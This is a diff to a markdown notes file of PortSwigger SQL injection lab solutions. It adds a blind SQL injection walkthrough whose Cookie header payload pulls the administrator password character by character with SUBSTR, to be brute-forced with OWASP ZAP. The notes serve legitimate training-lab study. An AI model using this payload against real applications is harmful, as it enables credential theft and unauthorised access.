@@ -155,6 +155,8 @@ https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-da
 
 ### Retrieve multiple values in a single column
 
+Login as administrator
+
 https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
 
 #### Solution
@@ -168,7 +170,18 @@ https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-mu
 
 ## Blind SQL injection
 
+### Blind SQL injection with conditional responses
+
 https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
+
+#### Solution
+1. Intercept the request with tracking id.
+2. Append the tracking id cookie value with the following SQL query.
+   
+   ```
+   Cookie: TrackingId=V1OUe47McOPDhNGq' AND SUBSTR((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'a; session=fwR6Azt6fN3RB8quKUmE35SxqmvMmpvd
+   ```
+3. Fuzz the position of character and the character value (OWASP ZAP works better for bruteforcing.)
 
 https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
 
